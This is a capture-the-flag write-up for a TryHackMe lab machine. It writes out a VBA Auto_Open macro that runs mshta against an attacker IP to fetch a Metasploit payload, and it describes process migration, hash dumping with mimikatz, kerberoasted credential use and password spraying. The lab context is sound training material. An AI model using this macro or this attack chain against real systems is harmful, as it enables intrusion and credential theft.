# TryHackMe-THROWBACK-TIME(100.20.34.176)

Since we ran socks4 proxy on port 1080 we use nmap along with proxychains to see if we can hit a port on TIME machine 

<img src="https://imgur.com/Oua6jV6.png"/>

So we can access the web page

<img src="https://imgur.com/Ap23uHS.png"/>

Going back to MAIL machine to get reset link by logging in as `MurhphyF`

<img src="https://imgur.com/ct7QiLo.png"/>

<img src="https://imgur.com/C2GtwAZ.png"/>

murphyf
PASSWORD

Now we need to update our `/etc/hosts` file

<img src="https://imgur.com/PoMKmTj.png"/>

We updated the password through the reset link and can login with those

<img src="https://imgur.com/bqC9YLA.png"/>

Create a microsoft execl macro document having this macro in it using metasploit hta server

<img src="https://imgur.com/Dc9SkJn.png"/>

```
Sub HelloWorld()
    PID = Shell("mshta.exe http://10.50.31.16:8000/j4KCBrR.hta")
End Sub

Sub Auto_Open()
    HelloWorld
End Sub
```

Where that .hta is generated through metasploit

<img src="https://imgur.com/hH3CtYv.png"/>

Upload that document

<img src="https://imgur.com/wMsI47W.png"/>

You will get a shell

<img src="https://imgur.com/rPVhUeX.png"/>

<img src="https://imgur.com/c50uP96.png"/>

By typing `sysinfo`

<img src="https://imgur.com/f8zyeGj.png"/>

We can see that we are on a 64 bit windows architecture but on 32 bit merterpreter session so we need to migrate to a 64 bit process. Running command `ps` to check currently running processes

<img src="https://imgur.com/bdOCw2v.png"/>

Here we need to identify the process which is running as `NT AUTHORITY\SYSTEM` also running as a 64 bit 

<img src="https://imgur.com/463bpoZ.png"/>

So we see this statisfying our requirements 

<img src="https://imgur.com/4hK07Bz.png"/>

And now we are the highest privileged user  also now our meterpeter session is on 64 bit  architecture

<img src="https://imgur.com/E32Xkih.png"/>

We can now run commands like mimikatz , hashdump 

<img src="https://imgur.com/QbbtiWT.png"/>

We have successfully dumped the hashes of the accounts on this machine

<img src="https://imgur.com/VeUFkA8.png"/>

Using proxychains we ssh with `Timekeeper's` credentials

<img src="https://imgur.com/1nIqZ4k.png"/>

Switch to directory where mysql.exe is 

<img src="https://imgur.com/U4SGngW.png"/>

Using the password from the kerberoasted mysql service account

<img src="https://i.imgur.com/rmE7npi.png"/>

<img src="https://imgur.com/4XA3GzU.png"/>

<img src="https://imgur.com/txG4w4O.png"/>

<img src="https://imgur.com/xzlIeYn.png"/>

<img src="https://imgur.com/bQ29SjC.png"/>

Save the list of usernames you found from `domain_users` database 

<img src="https://imgur.com/h5Eomzj.png"/>

We can utilize the same list of passwords we used to get access to Throwbacks mail

<img src="https://imgur.com/oEVEw8H.png"/>

<img src="https://imgur.com/TctWVPF.png"/>